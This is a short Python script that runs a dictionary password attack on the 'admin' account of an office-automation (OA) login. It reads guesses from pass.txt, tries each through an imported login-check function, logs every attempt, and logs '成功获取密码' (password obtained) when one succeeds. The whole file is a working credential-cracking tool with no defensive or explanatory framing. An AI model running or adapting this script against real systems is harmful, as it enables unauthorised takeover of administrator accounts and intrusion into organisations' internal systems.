import os


from oa_login_check import if_logined
from Tools.tools import debug_log


logger = debug_log(os.getcwd(), name='check_oa_login.log')
def crack_oa_fun():
    passfile = open('pass.txt', 'r')
    lines = passfile.readlines()
    passwd = ""
    for line in lines:
        passwd = line.replace(" ", "")
        passwd = passwd.replace("\n","")
        passwd = passwd.split('#')
        print(passwd)
        is_use = if_logined(username='admin', passwd=passwd[0])
        logger.debug(passwd[0] + '   logined')
        if is_use:
            passwd = passwd[0]
            logger.debug('成功获取密码   ' + passwd)
            break

if __name__ == '__main__':
    crack_oa_fun()